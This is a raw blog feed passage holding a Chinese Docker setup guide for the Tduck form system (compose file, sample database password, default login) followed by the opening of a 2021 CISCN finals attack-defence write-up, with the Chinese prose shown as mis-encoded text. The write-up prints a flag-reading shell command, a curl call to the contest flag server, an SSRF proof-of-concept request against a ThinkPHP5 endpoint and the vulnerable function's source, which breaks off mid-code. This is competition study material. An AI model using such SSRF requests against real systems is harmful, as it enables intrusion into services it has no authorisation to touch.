SPRING_MAIL_USERNAME=$MAIL_USERNAME</span></span><br><span class="line">    <span class="comment">#  - SPRING_MAIL_PASSWORD=$MAIL_PASSWORD</span></span><br><span class="line">    <span class="comment">#      - SPRING_REDIS_PASSWORD=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_APPID=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_SECRET=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_TOKEN=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_AESKEY=</span></span><br><span class="line">    <span class="comment">#      - OSS_OSSTYPE=</span></span><br><span class="line">    <span class="comment">#      - OSS_ENDPOINT=</span></span><br><span class="line">    <span class="comment">#      - OSS_ACCESSKEYID=</span></span><br><span class="line">    <span class="comment">#      - OSS_ACCESSKEYSECRET=</span></span><br><span class="line">    <span class="comment">#      - OSS_BUCKETNAME=</span></span><br><span class="line">    <span class="comment">#      - OSS_DOMAIN=</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;wbsu2003/tduck&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">23569</span><span class="string">:80</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tduck-redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6.2.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">36379</span><span class="string">:6379</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis_data:/data</span></span><br><span class="line">  <span class="attr">redis-commander:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis-commander</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">redis-commander</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rediscommander/redis-commander:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_HOSTS=local:$REDIS_HOST:$REDIS_PORT</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;28083:8081&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tduck-mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=$MYSQL_ROOT_PASSWORD</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=$MYSQL_DATABASE</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">43033</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql_data3:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tduck-platform/doc:/docker-entrypoint-initdb.d:ro</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql_data3:</span></span><br><span class="line">  <span class="attr">nginx_log:</span></span><br><span class="line">  <span class="attr">redis_data:</span> </span><br></pre></td></tr></table></figure><p><code>.env</code> æ–‡ä»¶ï¼Œç”¨çš„å®˜æ–¹æ ‡å‡†çš„ï¼Œåªé…ç½®äº† <code>mysql</code> å’Œ <code>redis</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">MYSQL_DATABASE=tduck</span></span><br><span class="line"><span class="string">MYSQL_ROOT_PASSWORD=abc123123</span></span><br><span class="line"><span class="string">SPRING_DATASOURCE_URL=jdbc:mysql://tduck-mysql/tduck?serverTimezone=Asia/Shanghai</span></span><br><span class="line"><span class="string">SPRING_DATASOURCE_NAME=root</span></span><br><span class="line"><span class="string">REDIS_HOST=tduck-redis</span></span><br><span class="line"><span class="string">REDIS_PORT=6379</span> </span><br></pre></td></tr></table></figure><p>æ„å»ºé•œåƒå’Œå®¹å™¨è¿è¡Œçš„åŸºæœ¬å‘½ä»¤å¦‚ä¸‹ğŸ‘‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–°å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹‰å–åç«¯ä»£ç </span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/TDuckApp/tduck-platform.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹‰å–å‰ç«¯ä»£ç </span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/TDuckApp/tduck-front.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† Dockerfile ã€supervisord.confã€nginx.confã€docker-compose.yamlã€.env äº”ä¸ªæ–‡ä»¶æ”¾è¿› tduck ç›®å½•ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºé•œåƒ</span></span><br><span class="line">docker build -t wbsu2003/tduck:v1 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> --user root -it tduck /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®å¯åŠ¨</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®åˆ é™¤</span></span><br><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><p>ç›®å½•ç»“æ„ğŸ‘‡</p><p><img src="https://img-blog.csdnimg.cn/img_convert/36376f3ede7175a44782474683622da4.png"></p><h1 id="å®‰è£…è¿è¡Œ"><a href="#å®‰è£…è¿è¡Œ" class="headerlink" title="å®‰è£…è¿è¡Œ"></a>å®‰è£…è¿è¡Œ</h1><ul><li>åœ¨ç¾¤æ™– <code>docker</code> ç›®å½•ä¸­æ–°å»ºå­ç›®å½• <code>tduck</code></li><li>ä¸‹è½½ <a href="https://github.com/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip">https://github.com/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip</a> æ–‡ä»¶ï¼Œå¦‚æœ <code>github</code> æŠ½é£äº†ï¼Œå¯ä»¥ä»é•œåƒç«™ç‚¹ä¸‹è½½ <a href="https://hub.fastgit.org/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip">https://hub.fastgit.org/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip</a></li><li>å°† <code>tduck.zip</code> ä¸Šä¼ åˆ° <code>tduck</code> ç›®å½•å†è§£å‹</li></ul><blockquote><p>å°½é‡ä¸è¦åœ¨ç”µè„‘ä¸Šå…ˆè§£å‹å†ä¸Šä¼ ï¼Œå› ä¸º <code>.env</code> é»˜è®¤æ˜¯çœ‹ä¸åˆ°çš„ï¼Œéœ€è¦æ‰“å¼€æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼Œéœ€é¿å…æ‹·è´æ–‡ä»¶ä¸¢å¤±å¯¼è‡´ä¸€é”®å¯åŠ¨å‡ºé”™</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d027403b86b8928ad1d54b3ae59d20ae.png"></p><p><code>__MACOSX</code> å’Œ <code>tduck.zip</code> å¯ä»¥åˆ æ‰ï¼Œä¸åˆ ä¹Ÿæ— æ‰€è°“çš„</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f7e4a8fd61ef5c0a39ed31bde60c45e0.png"></p><ul><li><p>æ ¹æ®éœ€è¦ä¿®æ”¹ <code>docker-compose.yaml</code> æ–‡ä»¶ï¼Œä¸»è¦åº”è¯¥å°±æ˜¯ç«¯å£ï¼Œå¦‚æœä½ è¦ä¿®æ”¹æ•°æ®åº“å¯ä»¥ç¼–è¾‘ <code>.env</code> æ–‡ä»¶ï¼Œç†è®ºä¸Šé€šè¿‡ä¿®æ”¹ <code>jdbc</code> å¯ä»¥ç›´æ¥ä½¿ç”¨ç¾¤æ™–è‡ªå¸¦çš„ <code>mariadb</code></p></li><li><p>ç”¨ <code>SSH</code> å®¢æˆ·ç«¯ç™»å½•åˆ°ç¾¤æ™–ï¼Œåœ¨ <code>tduck</code> ç›®å½•ä¸­æ‰§è¡Œä¸€é”®å¯åŠ¨</p></li></ul><blockquote><p>è€è‹å¸¸ç”¨çš„<code>SSH</code> å®¢æˆ·ç«¯ä¸»è¦æ˜¯ <code>Finalshell</code> å’Œ <code>PuTTY</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ docker ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> /volume2/docker/tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®å¯åŠ¨</span></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œä¼šæœ‰æ‹‰å–é•œåƒçš„åŠ¨ä½œ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1f01d5aa276aa511f65e4b8337e43bf1.png"></p><blockquote><p>å¦‚æœæœ€ç»ˆ <code>4</code> ä¸ªå®¹å™¨éƒ½æ˜¯ <code>done</code> ï¼Œè¡¨ç¤ºåˆ›å»ºæˆåŠŸï¼</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d2b6b6359ac1b1e2779031223ba1a7e5.png"></p><p>åœ¨ <code>docker</code> å®¹å™¨ä¸­èƒ½çœ‹åˆ°ğŸ‘‡ä¸‹é¢ <code>4</code> ä¸ªå®¹å™¨æ­£åœ¨è¿è¡Œ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/83c4474c80b600f4fc5bf701a4bc8222.png"></p><p>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ <code>http://ç¾¤æ™–IP:23569</code>ï¼Œå°±èƒ½çœ‹åˆ°ä¸»ç•Œé¢</p><p><img src="https://img-blog.csdnimg.cn/img_convert/34e7bdd1913e2278f7524d9f72688661.png"></p><p>ç‚¹å³ä¸Šè§’çš„ <code>ç™»å½•</code>ï¼Œå› ä¸ºæ²¡è®¾ç½®å¾®ä¿¡æ‰«ç ï¼Œæ‰€ä»¥ä¸€ç›´æ˜¯è½¬åœˆçš„</p><p><img src="https://img-blog.csdnimg.cn/img_convert/56cc6500894136b3a540ab3e924e2b0f.png"></p><p>ç³»ç»Ÿæœ‰ä¸ªé»˜è®¤çš„è´¦å· <code>test@tduckapp.com</code>ï¼Œå¯†ç ï¼š<code>12345678</code></p><blockquote><p>å®˜ç½‘æœ‰ç‚¹å‘ï¼Œå†™çš„é»˜è®¤è´¦å·æ˜¯ <code>test@tduck.com</code></p></blockquote><h2 id="é‚®ä»¶æ³¨å†Œ"><a href="#é‚®ä»¶æ³¨å†Œ" class="headerlink" title="é‚®ä»¶æ³¨å†Œ"></a>é‚®ä»¶æ³¨å†Œ</h2><p>å¦‚æœä½ éœ€è¦è‡ªå·±æ³¨å†Œè´¦å·ï¼Œæ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯å¢åŠ é‚®ä»¶çš„æ”¯æŒã€‚</p><ul><li>éœ€è¦å»æ‰ <code>docker-compose.yaml</code> ä¸­çº¢æ¡†ä¸­ 3 è¡Œå‰é¢çš„ <code>#</code> å·æ³¨é‡Š</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/c0d578bc60cbbe3477013a074da143c3.png"></p><ul><li>åœ¨ <code>.env</code> æœ€åé¢å¢åŠ ä¸‹é¢ <code>3</code> è¡Œ</li></ul><blockquote><p>è¯·æŒ‰ä½ è‡ªå·±çš„é‚®ç®±è®¾ç½®è¿›è¡Œå¡«å†™</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">MAIL_HOST=smtp.88.com</span></span><br><span class="line"><span class="string">MAIL_USERNAME=wbsu2003@88.com</span></span><br><span class="line"><span class="string">MAIL_PASSWORD=&lt;ç”¨äºç™»å½•ç¬¬ä¸‰æ–¹é‚®ä»¶å®¢æˆ·ç«¯çš„ä¸“ç”¨å¯†ç &gt;</span> </span><br></pre></td></tr></table></figure><ul><li>å…ˆä¸€é”®åˆ é™¤å†ä¸€é”®å¯åŠ¨</li></ul><blockquote><p>ä»»ä½•æ—¶å€™ï¼Œåˆ é™¤æ“ä½œè¿˜æ˜¯è¦æ…é‡</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸€é”®åˆ é™¤</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®å¯åŠ¨</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®åœæ­¢</span></span><br><span class="line">docker-compose stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®é‡å¯</span></span><br><span class="line">docker-compose restart </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9a722dc0ab22aee2e89f265694021241.png"></p><p>é€‰æ‹©ç”¨é‚®ç®±æ³¨å†Œ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b6316964e4abc79291a6c36ff27655e9.png"></p><p>é¡ºåˆ©çš„è¯å¾ˆå¿«å°±ä¼šæ”¶åˆ°æ³¨å†ŒéªŒè¯ç </p><p><img src="https://img-blog.csdnimg.cn/img_convert/e40c73aed2ce13ba3f64ed53dbf1d1e5.png"></p><p>å¡«å…¥éªŒè¯ç </p><p><img src="https://img-blog.csdnimg.cn/img_convert/0d5926c8507c310c2fec1598ab7a0000.png"></p><p>ç™»å½•æˆåŠŸåçš„ä¸»ç•Œé¢</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a87307f5e64c8774172474bb46ecc65b.png"></p><p>è¿›å…¥æ¨¡æ¿ä¸­å¿ƒï¼Œåˆ›å»ºç©ºç™½æ¨¡æ¿</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a29ba48aaec68248844ce4b1f34714a2.png"></p><p>å¯ä»¥æ‹–æ‹½è¿›è¡Œè®¾è®¡</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c921e01b0154404c2d9e551e7bcd812f.png"></p><p>å¦‚æœä½ æ‹–ä¸åŠ¨ï¼Œæ˜¯å› ä¸ºç»„ä»¶åœ¨çº¿çš„ä¸Šæ–¹</p><p><img src="https://img-blog.csdnimg.cn/img_convert/580e11de8b458b500919f01c6709247e.png"></p><p>æ‹–åˆ°ä¸‹æ–¹æ‰è¡Œ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dbdd58cc1dc948b3df3690470f591aca.png"></p><p>é¢„è§ˆä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2bc80300636efba9c4b0345587fc67b7.png"></p><h1 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h1><blockquote><p>tduck-platform: Tduck-å¡«é¸­æ”¶é›†å™¨æ˜¯ä¸€æ¬¾å¼€æºçš„è¡¨å•åœ¨çº¿æ”¶é›†ç³»ç»Ÿï¼Œåå°åŸºäºSpringBoot+MybatisPlus+MySql+Redisï¼Œå‰ç«¯åŸºäºVue ElementUIå¼€å‘ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œç•Œé¢ç¾è§‚ã€‚keywordsï¼šé—®å·&#x2F;è¡¨å•&#x2F;ä¿¡æ¯æ”¶é›†<br>åœ°å€ï¼š<a href="https://gitee.com/TDuckApp/tduck-platform">https://gitee.com/TDuckApp/tduck-platform</a></p></blockquote><blockquote><p>Tduckå¡«é¸­<br>åœ°å€ï¼š<a href="https://doc.tduckapp.com/">https://doc.tduckapp.com/</a></p></blockquote><blockquote><p>java - How to dockerize maven project? and how many ways to accomplish it? - Stack Overflow<br>åœ°å€ï¼š<a href="https://stackoverflow.com/questions/27767264/how-to-dockerize-maven-project-and-how-many-ways-to-accomplish-it">https://stackoverflow.com/questions/27767264/how-to-dockerize-maven-project-and-how-many-ways-to-accomplish-it</a></p></blockquote><blockquote><p>ä½¿ç”¨Dockerè¿è¡ŒTduck | æˆ´æˆ´çš„Linux<br>åœ°å€ï¼š<a href="https://daishenghui.club/2021/06/30/categories/Linux/%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8CTduck/#%E5%8D%8A%E5%B0%8F%E7%99%BD%E7%AF%87">https://daishenghui.club/2021/06/30/categories/Linux/%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8CTduck/#%E5%8D%8A%E5%B0%8F%E7%99%BD%E7%AF%87</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰&quot;&gt;&lt;a href=&quot;#åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰&quot;&gt;&lt;/a&gt;åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdocker</summary>
      
    
    
    
    <category term="code" scheme="https://lhhxs.github.io/categories/code/"/>
    
    
    <category term="tduck" scheme="https://lhhxs.github.io/tags/tduck/"/>
    
    <category term="docker" scheme="https://lhhxs.github.io/tags/docker/"/>
    
    <category term="java" scheme="https://lhhxs.github.io/tags/java/"/>
    
    <category term="nodejs" scheme="https://lhhxs.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>2021 CISCN å†³èµ›æ‚è®°</title>
    <link href="https://lhhxs.github.io/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/"/>
    <id>https://lhhxs.github.io/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/</id>
    <published>2022-09-09T17:27:02.778Z</published>
    <updated>2022-09-09T17:27:02.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><p>ç¬¬ä¸€å¤©èµ›åˆ¶æ˜¯awd+å¯ä¿¡è®¡ç®—ï¼Œawdå…ˆæ”¾äº†ä¸¤é“webä¸¤é“pwnï¼Œå¯ä¿¡è®¡ç®—æ”¾äº†ä¸€é¢˜ã€‚æ”¾çš„webåˆ†åˆ«æ˜¯10.1.x.2å’Œ10.1.x.4ï¼Œä¸ºäº†æ–¹ä¾¿ä¸‹é¢ç§°ä¸ºweb2å’Œweb4ï¼Œä¸‹åˆä¸¤ä¸‰ç‚¹çš„æ—¶å€™æ”¾å‡ºäº†web10.1.x.3ï¼Œåé¢ç§°ä¸ºweb3ã€‚</p><blockquote><p>è¿™é‡Œçš„expæˆ‘ç”¨äº†è‡ªå·±çš„AWDæ¡†æ¶è¿›è¡Œäº†å°è£…ï¼Œè¦çœ‹ç›´æ¥å½“æˆæ­£å¸¸çš„requestsè¯·æ±‚å°±è¡Œã€‚</p></blockquote><p>æ¯”èµ›çš„æ‹“æ‰‘æ˜¯80åªé˜Ÿï¼Œé¶æœºipæ˜¯10.1.{é˜Ÿä¼id}.{é¢˜ç›®id}ã€‚</p><p>é˜Ÿä¼è´Ÿè´£é˜²å¾¡çš„å¸ˆå‚…å‘ç°é¶æœºæ²¡æœ‰pyï¼Œè„šæœ¬ä¸èƒ½runï¼Œä¸Šçš„phplogé˜²å¾¡å¯¼è‡´äº†ä¸€æ³¢å®•æœºä¹‹åæˆ‘ä»¬WEBå¿ƒæ€å°±æœ‰ç‚¹å°å´©ã€‚</p><p>é¡ºä¾¿ä¸€æè¿™æ¬¡çš„awdwebè·Ÿä»¥å‰æ‰“è¿‡çš„awdwebå¾ˆä¸ä¸€æ ·ï¼Œæœ€æ˜æ˜¾çš„æ˜¯æ§æƒäº†ï¼Œè®¾ç½®äº†å¾ˆå¤šdisable_Functioné¿å…æ”»å‡»é˜Ÿå¯¹é¶æœºé€ æˆç ´åï¼Œå·²ç»è®¾ç½®äº†ç‹¬ç‰¹çš„flagè¯·æ±‚æ–¹å¼ã€‚å°è±¡é‡Œflagçš„è·å¾—æ–¹å¼ä¸€ç›´æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡awdå®‰æ’æŠŠflagæ•´æˆäº†è¿™æ ·ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://flagserver.top/index.php?token=xxxxxx&quot;</span>) <span class="comment">// è¿œç¨‹è¯·æ±‚flagserver</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl http://flagserver.top/index.php?token=xxxxxx&quot;</span>) <span class="comment">// æˆ–è€…ç›´æ¥è°ƒç”¨curlè¯·æ±‚</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯æ‹¿åˆ°æƒé™ä¹‹åéœ€è¦ç”¨é¶æœºå†æ¬¡å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨æ‹¿åˆ°flagå†æäº¤ä¸€æ¬¡ã€‚è¿˜æœ‰å°±æ˜¯ç”±äºset_time_limitå’Œignore_user_abortä¸¤ä¸ªå‡½æ•°éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸æ­»é©¬å†™ä¸ä¸Šäº†ï¼Œè‡³å°‘åœ¨æ¯”èµ›ç»“æŸæ—¶ï¼Œæˆ‘ä»¬çš„é¶æœºéƒ½æ˜¯æŒºå¹²å‡€çš„ã€‚</p><p>9ç‚¹20åˆ†çš„æ—¶å€™ç™½æ³½å°±æ‹¿åˆ°äº†webçš„ä¸€è¡€ï¼Œä¸æ¸…æ¥šä»–ä»¬æœ‰æ²¡æœ‰æ‰“æ»¡ç¬¬ä¸€è½®ï¼Œç¬¬äºŒè½®çš„æ—¶å€™å°±æœ‰å‡ åªé˜Ÿä¼åŒæ ·æ‰“é€šäº†ã€‚</p><p>ç”±äºå»¶æ—¶æµé‡ï¼Œæ²¡æœ‰å¾ˆåŠæ—¶çš„ä¸Šè½¦ï¼Œä¹Ÿæ²¡æ‰«å‡ºæ¥æ´ä½†æ˜¯å…¶å®è¿™ä¸ªæ´å¾ˆæ˜æ˜¾çš„ï¼Œä½†æ˜¯Dç›¾æ²¡æ‰«å‡ºæ¥ï¼Œç„¶åä¸»è¦æ˜¯æˆ‘å½“æ—¶åˆ¤æ–­å¤§å®¶éƒ½å‡ºçš„è¿™ä¹ˆå¿«åº”è¯¥æ˜¯æ¡†æ¶æ´ï¼Œå°±ä¸€ç›´åœ¨å°è¯•tp5çš„pocï¼Œä»¥åŠevalä¹‹ç±»çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œå®Œç¾çš„é”™è¿‡äº†ç‚¹ï¼Œåé¢å…³æ‰äº†å¼ºåˆ¶è·¯ç”±å˜é‡è¿˜è¢«checkåˆ¤downäº†ã€‚</p><p>å¤§æ¦‚åœ¨å››äº”ååˆ†çš„æ—¶å€™PWNçˆ·æ‹¿åˆ°äº†ä¸€è¡€ï¼ŒæŠŠåˆ†æ•°ç¨³å®šäº†ä¸‹æ¥ï¼Œç„¶åç™½æ³½å’Œæˆ‘ä»¬åˆ†åˆ«æ‹¿äº†å¯ä¿¡è®¡ç®—çš„ä¸€äºŒè¡€ï¼Œ10ç‚¹å¼€å§‹æˆ‘ä»¬çš„web2å°±ä¸Šè½¦å†™äº†expï¼Œå½“æ—¶å†™çš„æ¯”è¾ƒåŠæ—¶ï¼Œå†™å®Œä¹‹åè¿˜èƒ½æ‰“å››äº”ååªé˜Ÿï¼Œè¿‡äº†ä¸¤è½®å°±æ‰“ä¸äº†å¤šå°‘äº†ï¼Œå¤§å®¶éƒ½æ‹¿ç€æµé‡ä¸Šè½¦äº†ï¼Œç„¶ååº”è¯¥æ˜¯ç¬¬äº”è½®æˆ‘ä»¬patchä¸Šäº†ï¼Œç„¶åæˆ‘ä»¬çŸ­æš‚çš„ä½“éªŒäº†ä¸€ä¼šå„¿ç¬¬ä¸€ï¼ˆè™½ç„¶é¡¶äº†è¿˜æ²¡ä¸¤è½®å°±å¾ˆå¿«å°±ä¸‹å»äº†ï¼Œè€Œä¸”å¾ˆå¿«WEB2åˆè¢«æ–°payloadæ‰“äº†ï¼‰ã€‚</p><p>å›åˆ°è¿™ä¸ªæ´ï¼Œç®€å•çš„POCå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index/Api/curlfun?url=http://flagserver.top/index.php?token=xxxxxx</span><br></pre></td></tr></table></figure><p>tp5æ¡†æ¶ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„é€»è¾‘ï¼Œè°ƒç”¨äº†Apiæ§åˆ¶å™¨çš„curlfunå‡½æ•°ï¼Œè·Ÿè¿›ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//curlè·å–æ•°æ®</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curlfun</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$method</span> = <span class="string">&#x27;GET&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$opts</span> = <span class="keyword">array</span>(CURLOPT_TIMEOUT =&gt; <span class="number">10</span>, CURLOPT_RETURNTRANSFER =&gt; <span class="number">1</span>, CURLOPT_SSL_VERIFYPEER =&gt; <span class="literal">false</span>, CURLOPT_SSL_VERIFYHOST =&gt; <span class="literal">false</span>, CURLOPT_HTTPHEADER =&gt; <span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æ ¹æ®è¯·æ±‚ç±»å‹è®¾ç½®ç‰¹å®šå‚æ•° */</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="variable">$url</span> . <span class="string">&#x27;?&#x27;</span> . <span class="title function_ invoke__">http_build_query</span>(<span 